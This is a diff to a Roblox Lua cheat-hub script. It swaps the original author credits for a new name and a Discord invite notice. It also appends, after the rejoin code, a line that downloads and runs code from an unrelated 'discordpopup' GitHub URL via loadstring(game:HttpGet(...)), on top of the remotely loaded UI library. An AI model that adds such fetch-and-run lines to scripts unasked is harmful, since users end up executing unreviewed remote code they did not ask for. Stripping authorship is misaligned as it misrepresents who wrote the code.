@@ -1,6 +1,6 @@
--- made by SMUG#0558
--- gui library made by shidemuri on github (i stole from pendulum hub LOL)
--- this script was made so i could have all the scripts i use (and scripts my friends use) in one GUI
+-- made by n0ra_xd
+-- if you showcase this script keep the discord invite
+
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/shidemuri/scripts/main/ui_lib.lua"))()
 local Pendulum = Library:New("pears to pairs fucker")
 
@@ -132,3 +132,5 @@ local p = game:GetService("Players").LocalPlayer
 
 ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
 end)
+wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/discordpopup/main/discord-popup",true))()
